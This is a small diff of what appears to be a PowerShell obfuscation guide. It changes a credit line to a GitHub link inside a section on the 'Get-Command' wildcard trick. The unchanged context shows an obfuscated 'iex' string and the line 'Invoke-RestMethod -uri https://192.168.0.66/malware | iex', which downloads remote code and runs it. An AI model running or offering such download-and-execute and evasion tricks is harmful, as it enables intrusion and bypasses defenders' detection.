@@ -223,7 +223,7 @@ ie""x'' "p`"`"w''d`"`""
 ```
 
 ## Get-Command Technique
-A really cool trick my friend and mighty haxor Karol Musolff (@kmusolff) showed me. You can use `Get-Command` (or `gcm`) to retrieve the name (string) of any command, including all of the non-PowerShell files in the Path environment variable (`$env:Path`) by using the wildcards. You can then run them as jobs with the `&` operator. For example, the following line:
+A really cool trick my friend and mighty haxor Karol Musolff ([@kmusolff](https://github.com/kmusolff)) showed me. You can use `Get-Command` (or `gcm`) to retrieve the name (string) of any command, including all of the non-PowerShell files in the Path environment variable (`$env:Path`) by using the wildcards. You can then run them as jobs with the `&` operator. For example, the following line:
 ```
 Invoke-RestMethod -uri https://192.168.0.66/malware | iex
 ```
